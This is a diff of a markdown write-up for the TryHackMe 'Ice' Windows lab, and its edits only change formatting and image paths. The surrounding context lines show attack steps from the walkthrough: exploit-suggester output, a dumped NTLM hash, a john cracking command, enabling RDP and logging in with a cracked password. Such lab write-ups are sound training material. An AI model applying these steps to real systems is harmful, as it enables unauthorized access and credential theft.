@@ -1,20 +1,20 @@
 # Ice
 
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+![tryhackme.com - © TryHackMe](<../../../../../.gitbook/assets/tryhackme-logo-small (2).png>)
 
----
+***
 
 ## Intro
 
-| Room Info           | ![](.gitbook/assets/ice.png)          |
-| :------------------ | ------------------------------------- |
-| 🔗 Name              | [Ice](https://tryhackme.com/room/ice) |
-| 🎯 Target IP         | `10.10.159.9`                         |
-| 📈 Difficulty level  | 🟢Easy                                 |
-| 💲 Subscription type | Free                                  |
-| 🪟 OS                | Windows                               |
+| Room Info            | ![](../../../../../.gitbook/assets/ice.png) |
+| -------------------- | ------------------------------------------- |
+| 🔗 Name              | [Ice](https://tryhackme.com/room/ice)       |
+| 🎯 Target IP         | `10.10.159.9`                               |
+| 📈 Difficulty level  | 🟢Easy                                      |
+| 💲 Subscription type | Free                                        |
+| 🪟 OS                | Windows                                     |
 
----
+***
 
 ## Recon
 
@@ -42,7 +42,7 @@ MAC Address: 02:58:8C:89:6C:3D (Unknown)
 Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
----
+***
 
 ## Exploitation
 
@@ -85,7 +85,7 @@ Meterpreter     : x86/windows
 9 exploit/windows/local/tokenmagic                 Yes The target appears to be vulnerable.
 ```
 
----
+***
 
 ## Privilege Escalation
 
@@ -129,7 +129,7 @@ SeTimeZonePrivilege
 SeUndockPrivilege
 ```
 
----
+***
 
 ## Post Exploitation
 
@@ -163,7 +163,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes_ice.txt
 ```
 
-![](.gitbook/assets/image-20230510172241398.png)
+![](../../../../../.gitbook/assets/image-20230510172241398.png)
 
 ```bash
 screenshare
@@ -178,6 +178,6 @@ run post/windows/manage/enable_rdp
 xfreerdp /u:Dark /p:Password01! /v:10.10.159.9
 ```
 
-![](.gitbook/assets/image-20230510171923611.png)
+![](../../../../../.gitbook/assets/image-20230510171923611.png)
 
 ***
